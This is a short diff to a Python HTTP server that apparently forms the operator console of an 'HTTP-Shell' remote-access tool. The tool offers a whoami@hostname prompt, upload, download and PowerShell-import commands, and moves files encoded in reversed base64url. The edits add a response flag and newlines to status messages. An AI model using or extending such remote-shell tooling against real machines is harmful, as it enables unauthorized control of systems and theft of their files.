@@ -91,6 +91,7 @@ class MyServer(BaseHTTPRequestHandler):
                         encoded_file += self.encode_file_revbase64url(file_content)
                         self._set_headers()
                         self.wfile.write(encoded_file.encode("utf-8"))
+                        cmd_response = True
                 except:
                     print(colored(f"[!] Error reading \"{filename}\" file!\n", "red"))
 
@@ -103,7 +104,7 @@ class MyServer(BaseHTTPRequestHandler):
                 path = prompt.split("!")[-1]
                 cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                 cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
-                old_user = whoami
+                old_user = whoami ; comand = None
 
                 if "\\" in path:
                     slash = "\\"
@@ -171,7 +172,7 @@ class MyServer(BaseHTTPRequestHandler):
                         local_path = args[1]
                         remote_path = args[2]
                         command = "upload " + args[1] + "!" + args[2]
-                        print(colored(f"[+] Uploading {local_path} in {remote_path}..","green"))
+                        print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))
 
                 if "download" in command.split()[0]:
                     args = oslex.split(command)
@@ -182,7 +183,7 @@ class MyServer(BaseHTTPRequestHandler):
                         remote_path = args[1]
                         local_path = args[2]
                         command = "download " + args[1] + "!" + args[2]
-                        print(colored(f"[+] Downloading {remote_path} in {local_path}..","green"))
+                        print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
 
                 if "import-ps1" in command.split()[0]:
                     args = oslex.split(command)
@@ -268,6 +269,7 @@ class MyServer(BaseHTTPRequestHandler):
                         file_content = self.decode_file_revbase64url(encoded_payload)
                         filename.write(file_content)
                         self.wfile.write(response.encode())
+                        cmd_response = True
                 except:
                     print(colored(f"[!] Error writing \"{filename}\" file!\n", "red"))
 
